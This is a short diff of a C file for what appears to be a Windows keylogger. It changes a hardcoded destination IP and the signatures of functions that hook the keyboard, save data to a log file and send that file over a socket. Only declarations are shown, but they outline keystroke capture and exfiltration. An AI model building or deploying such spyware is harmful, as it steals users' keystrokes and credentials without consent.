@@ -10,7 +10,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #define BUFFSIZE 1024
 # define LOGFILE		"C:\\test.txt"
-#define IP "10.224.33.92"
+#define IP "10.224.34.61"
 
 struct keyboard
 {
@@ -21,6 +21,6 @@ struct keyboard
 void	setwinhook();
 void	save_data(const char*);
 SOCKET	init_socket(SOCKET*);
-void	send_data(SOCKET, FILE*);
-void	keep_alive_client_and_init(SOCKET*);
+void	send_data(SOCKET*, FILE*);
+void	keep_alive_client_and_init(void);
 void	server(SOCKET *);
